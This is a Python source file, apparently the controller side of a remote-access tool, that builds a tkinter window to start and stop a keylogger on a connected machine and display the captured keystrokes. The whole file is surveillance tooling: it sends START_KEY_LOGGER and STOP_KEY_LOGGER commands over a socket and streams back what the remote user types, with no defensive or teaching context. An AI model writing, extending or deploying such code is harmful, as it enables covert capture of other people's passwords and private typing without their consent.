from tkinter import ttk
from pynput import keyboard
import tkinter as tk
from tkinter import scrolledtext
import threading

keylogger_running = False
keys_pressed = ""
MAX_LINE_LENGTH = 50


def key_logger(client_socket, output_widget):
    """
    Keylogger logic to capture and display keystrokes received from the server.
    Continuously listens to the server for keystrokes and displays them.
    """
    global keylogger_running
    keylogger_running = True

    while keylogger_running:
        try:
            # Receive keystrokes from the server
            char = client_socket.recv(1024).decode()  # Adjust buffer size if needed
            if not char:
                break  # Exit if the connection is closed
            
            # Update the output widget with the received characters
            output_widget.insert(tk.END, char)
            output_widget.see(tk.END)
        except Exception as e:
            print(f"Error receiving keylogging data: {e}")
            break

    keylogger_running = False
    print("Keylogger listening stopped.")

def start_key_logger(client_socket, output_widget):
    """
    Start the keylogger in the existing output widget.
    """
    global keylogger_running
    if keylogger_running:
        print("Keylogger is already running.")
        return

    try:
        # Test if the socket is connected
        client_socket.sendall("START_KEY_LOGGER".encode())
        print("Sent START_KEY_LOGGER to the server.")
    except Exception as e:
        print(f"Error: Unable to start keylogger. Socket issue: {e}")
        return

    # Start the keylogger in a thread
    keylogger_thread = threading.Thread(
        target=key_logger, args=(client_socket, output_widget), daemon=True
    )
    keylogger_thread.start()
    print("Keylogger thread started.")

def stop_key_logger(client_socket):
    """
    Stop the keylogger.
    """
    global keylogger_running
    if not keylogger_running:
        return

    keylogger_running = False
    client_socket.sendall("STOP_KEY_LOGGER".encode())
    print("Keylogger stopped.")


def toggle_key_logger(client_socket):
    """
    Open a window with Start and Stop buttons for the keylogger.
    """
    # Create a new window
    keylogger_window = tk.Toplevel()
    keylogger_window.title("Keylogger Control")
    keylogger_window.geometry("600x400")

    # Layout for the window
    content_frame = tk.Frame(keylogger_window)
    content_frame.pack(fill="both", expand=True, padx=10, pady=10)

    # Keystroke output widget
    output_label = tk.Label(content_frame, text="Captured Keys:", font=("Roboto", 14))
    output_label.pack(pady=5, anchor="w")

    output_widget = scrolledtext.ScrolledText(content_frame, wrap=tk.WORD, font=("Roboto", 12), height=15)
    output_widget.pack(expand=True, fill="both", pady=(0, 10))

    # Start and Stop buttons
    button_frame = tk.Frame(content_frame)
    button_frame.pack(pady=10)

    style = ttk.Style()
    style.theme_use("clam")
    style.configure(
        "Rounded.TButton",
        padding=(10, 10),  
        relief="flat",
        background="#0078D7",
        foreground="white",
        font=("Roboto", 16)  
    )
    style.map(
        "Rounded.TButton",
        background=[("active", "white"), ("!disabled", "#7f868e")],
        foreground=[("active", "black")],
        relief=[("pressed", "flat"), ("!pressed", "raised")]
    )

    start_button = ttk.Button(
        button_frame, 
        text="Start Keylogger", 
        style="Rounded.TButton", 
        command=lambda: start_key_logger(client_socket, output_widget),
    )
    start_button.pack(side=tk.LEFT, padx=10)

    stop_button = ttk.Button(
        button_frame,
        text="Stop Keylogger",
        style="Rounded.TButton", 
        command=lambda: stop_key_logger(client_socket),
    )
    stop_button.pack(side=tk.LEFT, padx=10)

    # Handle closing the window
    def on_close():
        stop_key_logger(client_socket)
        keylogger_window.destroy()

    keylogger_window.protocol("WM_DELETE_WINDOW", on_close)
